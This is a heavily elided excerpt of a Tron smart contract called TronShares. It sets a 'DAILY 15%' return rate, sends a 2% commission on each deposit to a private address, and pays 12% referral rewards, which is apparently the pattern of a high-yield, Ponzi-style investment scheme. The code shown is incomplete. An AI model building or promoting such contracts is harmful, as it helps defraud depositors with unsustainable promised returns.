...
contract TronShares {
    ...
    uint public devsCommission = 2;
    uint public commissionDivisor = 100;
    uint private minuteRate = 1736100; //DAILY 15%
    uint private releaseTime = 1594620000;

    address owner;
    address private scontract;
    ...
    function deposit(address _affAddr) public payable {
        ...
        uint devsEarn = depositAmount.mul(devsCommission).div(commissionDivisor);
        scontract.transfer(devsEarn);
    }
    ...
    function distributeRef(uint256 _trx, address _affFrom) private{
        ...
        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(12)).div(100);
